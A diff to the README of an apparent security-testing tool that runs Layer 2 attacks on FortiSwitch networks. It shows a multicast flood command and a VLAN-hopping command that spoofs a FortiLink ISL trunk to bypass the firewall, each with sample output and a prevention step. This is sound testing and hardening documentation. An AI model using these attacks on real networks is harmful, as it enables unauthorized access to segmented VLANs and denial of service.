@@ -26,11 +26,50 @@ apt-get install tcpreplay
 
 ### Flood
 
+Flood will prepare packets in memory, and send out all at maximum speed. Mainly created to test storm control.
+
 #### Attack
 
+```
+sudo ./fsw_l2_attack.py flood -t unknown_multicast -c 1000
+Launching flood attack: unknown_multicast
+Generating 1000 multicast flood packets
+Sending packets...Done
+```
+#### Prevention
+
+Set MAC address learning limit per port to prevent CAM table overflow. Enable storm control to limit impact on network and switch/firewall processes.
+
+
+### VLAN Hopping
+
+By default Fortiswitches establish ISL tunnels (VLAN Trunks) automatically to other FortiSwitches. This attack will simulate a FortiSwitch and establish a FortiLink ISL Tunnel to a FortiSwitch from your computer. This allows access all VLANs bypassing the Firewall.
+
+#### Attack
+
+```
+sudo ./fsw_l2_attack.py vlanhop
+Launching vlanhop attack
+Listening for LLDP packets...received
+System name: SW2-1
+System description: FortiSwitch-448E-FPOE v7.2.5,build0453,230707 (GA)
+Switchport interface: port1
+Switch management address: 10.255.1.6
+Listening for Fortigate LLDP TLVs...Found
+Switch Serialnumber: S448EFTF23000000
+Establishing FortiLink ISL...LACP Trunk established
+
+To access the VLANs from your host run:  sudo ip link add link ens33 name ens33.<vlan-id> type vlan id <vlan-id>
+Keep this program running in the background
+
+Detected VLANs (passivly):
+200
+210
+```
 
 #### Prevention
 
+Either disable LLDP completely on the switchports, or change assigned LLDP Profile from 'default-auto-isl' to 'default'.
 
 ## Disclaimer
 
